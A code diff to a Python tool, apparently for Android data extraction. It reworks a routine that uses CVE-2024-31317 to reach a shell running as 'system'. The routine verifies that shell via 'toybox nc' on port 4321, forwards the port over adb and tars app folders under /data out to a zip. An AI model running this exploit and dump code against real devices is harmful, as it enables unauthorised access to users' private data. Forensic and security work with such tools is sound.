@@ -1539,8 +1539,8 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
     """
 
     text.configure(text="Performing Data-Extraction")
-
-    def rec_pull_contents(src: str, dst: typing.Union[str, pathlib.Path], rel_in_zip: str, prog_text, progress, exist_ok: bool = True) -> int:
+    rootf = src
+    def rec_pull_contents(src: str, dst: typing.Union[str, pathlib.Path], rootf: str, rel_in_zip: str, prog_text, progress, exist_ok: bool = True) -> int:
         s = 0
         global data_size
         global total_size
@@ -1559,10 +1559,10 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
             new_src:str = append_path(src, dir.path) 
             new_dst:pathlib.Path = pathlib.Path(append_path(dst, dir.path)) 
             os.makedirs(new_dst, exist_ok=exist_ok)
-            zip_dir_path = f"sdcard/{rel_in_zip}/{dir.path}/"
+            zip_dir_path = f"{rootf}/{rel_in_zip}/{dir.path}/"
             zip.writestr(zip_dir_path, b'')
             new_rel = f"{rel_in_zip}/{dir.path}"
-            s += rec_pull_contents(new_src, new_dst, new_rel, prog_text, progress, exist_ok=exist_ok)
+            s += rec_pull_contents(new_src, new_dst, rootf, new_rel, prog_text, progress, exist_ok=exist_ok)
                 
         for file in files:
             new_src:str = append_path(src, file.path) 
@@ -1574,7 +1574,7 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
             try:
                 with open(new_dst, "rb") as f:
                     data = f.read()
-                zip_rel_path = f"sdcard/{rel_in_zip}/{file.path}" 
+                zip_rel_path = f"{rootf}/{rel_in_zip}/{file.path}" 
                 zip.writestr(zip_rel_path, data)
                 os.remove(new_dst)
             except Exception as e:
@@ -1597,7 +1597,7 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
         dst = pathlib.Path(dst)
         
     os.makedirs(dst, exist_ok=exist_ok)
-    func_size = rec_pull_contents(src, dst, rel_in_zip="", prog_text=prog_text, progress=progress, exist_ok=exist_ok)
+    func_size = rec_pull_contents(src, dst, rootf, rel_in_zip="", prog_text=prog_text, progress=progress, exist_ok=exist_ok)
     zip.close()
     change.set(1)
     return func_size
@@ -1606,7 +1606,7 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
 def exploit_zygote(zip_path, text, prog_text, change):
 
     text.configure(text="Expoliting CVE-2024–31317 to acquire \"system\"-Files")
-
+    zytotal = 0
     def dump_folder_cve(name, zipname):
         cmd = f'tar cf - {name} 2>/dev/null\nexit\n'
         cmd_bytes = cmd.encode("utf-8")
@@ -1614,13 +1614,14 @@ def exploit_zygote(zip_path, text, prog_text, change):
         sock.settimeout(10)  
         start_time = time.time()
         try:
-            print(f"[+] connecting to {host}:4321 …")
+            #print(f"[+] connecting to {host}:4321 …")
             sock.connect((host, 4321))
 
             sock.settimeout(timeout_seconds)
-            print(f"[+] sending command: {cmd.strip()!r}")
-            sock.sendall(cmd_bytes)
 
+            #print(f"[+] sending command: {cmd.strip()!r}")
+            text.configure(text=f"Expoliting CVE-2024–31317 to acquire \"system\"-Files\nTrying to pull {name}")
+            sock.sendall(cmd_bytes)
             with zipfile.ZipFile(zipname, "a", compression=zipfile.ZIP_DEFLATED) as zf:
                 class SocketReader(io.RawIOBase):
                     
@@ -1653,6 +1654,7 @@ def exploit_zygote(zip_path, text, prog_text, change):
                 sock.close()
             except Exception:
                 pass
+            return zytotal
 
     def send_and_receive(sock, cmd, idle_timeout=0.3, overall_timeout=4.0):
         if not cmd.endswith("\n"):
@@ -1691,32 +1693,35 @@ def exploit_zygote(zip_path, text, prog_text, change):
     ''')
     cmd = '''sh -c \"echo 'whoami' | toybox nc localhost 4321\"'''
     whoami = device.shell(cmd)
-    print(whoami)
-    device.forward("tcp:4321", "tcp:4321")
-    host = "localhost"
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(10)  
-    sock.connect((host, 4321))
-    data_test = send_and_receive(sock=sock, cmd='ls /data')
+    #print(whoami)
+    if "system" in whoami:
+        device.forward("tcp:4321", "tcp:4321")
+        host = "localhost"
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)  
+        sock.connect((host, 4321))
+        data_test = send_and_receive(sock=sock, cmd='ls /data')
 
-    timeout_seconds=600
+        timeout_seconds=600
 
-    app_uid = {}
-    device.forward("tcp:4321", "tcp:4321")
+        app_uid = {}
+        device.forward("tcp:4321", "tcp:4321")
 
-    if "/data: Permission denied" in data_test:
-        for app in all_apps:
-            app_user = send_and_receive(sock=sock, cmd=f"stat /data/data/{app}")
-            uid_re = re.search(r'Uid:\s*\(\s*(\d+)\s*/', app_user)
-            uid = uid_re.group(1) if uid_re else None            
-            if uid != "1000" and uid != None:
-                pass
-            else:
-                dump_folder_cve(f"/data/data/{app}", zip_path)
-        dump_folder_cve("/data/app", zip_path)
+        if "/data: Permission denied" in data_test:
+            for app in all_apps:
+                app_user = send_and_receive(sock=sock, cmd=f"stat /data/data/{app}")
+                uid_re = re.search(r'Uid:\s*\(\s*(\d+)\s*/', app_user)
+                uid = uid_re.group(1) if uid_re else None            
+                if uid != "1000" and uid != None:
+                    pass
+                else:
+                    dump_folder_cve(f"/data/data/{app}", zip_path)
+            dump_folder_cve("/data/app", zip_path)
 
+        else:
+            dump_folder_cve("/data/", zip_path)
     else:
-        dump_folder_cve("/data/", zip_path)
+        text.configure(text="Expoliting CVE-2024–31317 failed.")
     change.set(1)
 
 device = None
